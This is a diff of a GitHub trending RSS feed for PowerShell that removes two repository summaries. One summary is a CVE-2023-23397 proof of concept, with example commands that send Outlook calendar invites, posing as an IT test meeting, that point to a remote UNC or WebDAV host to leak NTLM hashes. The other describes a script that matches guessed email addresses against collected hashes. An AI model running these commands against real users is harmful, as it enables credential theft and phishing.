@@ -1,21 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
   <title>GitHub PowerShell Daily Trending</title>
   <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
-  <updated>2023-03-19T01:44:16Z</updated>
+  <updated>2023-03-20T01:42:10Z</updated>
   <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
   <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
-  <entry>
-    <title>api0cradle/CVE-2023-23397-POC-Powershell</title>
-    <updated>2023-03-19T01:44:16Z</updated>
-    <id>tag:github.com,2023-03-19:/api0cradle/CVE-2023-23397-POC-Powershell</id>
-    <link href="https://github.com/api0cradle/CVE-2023-23397-POC-Powershell" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2023-23397-POC-Powershell&lt;/h1&gt; &#xA;&lt;p&gt;Script functions to either send or save calendar NTLM leakage using the ReminderSoundFile option. Run script to load the functions in Powershell, then you can use the examples below as a starting point for using the functions. Requires to be run on a Windows machine with Outlook installed since it uses the Outlook COM object to send emails. Note that it will send the email from the email account associated with Outlook. The current functions will add the meeting start time as of when the script is execute and set it to last 2 hours.&lt;/p&gt; &#xA;&lt;p&gt;Sending:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Send-CalendarNTLMLeak -recipient &#34;user.name@exampledomain.com&#34; -remotefilepath &#34;\\10.10.10.10\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Send-CalendarNTLMLeak -recipient &#34;user.name@exampledomain.com&#34; -remotefilepath &#34;\\files.domain.com\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Send-CalendarNTLMLeak -recipient &#34;user.name@exampledomain.com&#34; -remotefilepath &#34;\\files.domain.com@80\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Send-CalendarNTLMLeak -recipient &#34;user.name@exampledomain.com&#34; -remotefilepath &#34;\\files.domain.com@SSL@443\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Saving:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Save-CalendarNTLMLeak -remotefilepath &#34;\\10.10.10.10\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Save-CalendarNTLMLeak -remotefilepath &#34;\\files.domain.com\notexists\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Save-CalendarNTLMLeak -remotefilepath &#34;\\files.domain.com@80\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;Save-CalendarNTLMLeak -remotefilepath &#34;\\files.domain.com@SSL@443\file.wav&#34; -meetingsubject &#34;Test Meeting&#34; -meetingbody &#34;Just a test meeting from IT, can be deleted&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Hack the Planet!&lt;/p&gt;</summary>
-  </entry>
-  <entry>
-    <title>kfosaaen/EmailGenerator</title>
-    <updated>2023-03-19T01:44:16Z</updated>
-    <id>tag:github.com,2023-03-19:/kfosaaen/EmailGenerator</id>
-    <link href="https://github.com/kfosaaen/EmailGenerator" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;This is a simple PowerShell script that takes in some source info (from iOS Game Center) and generates potential email addresses to SHA1 and compare against some collected hashes. It&#39;s not complete, or very efficient, but that&#39;s not really important at this time.&lt;/p&gt;</summary>
-  </entry>
 </feed>
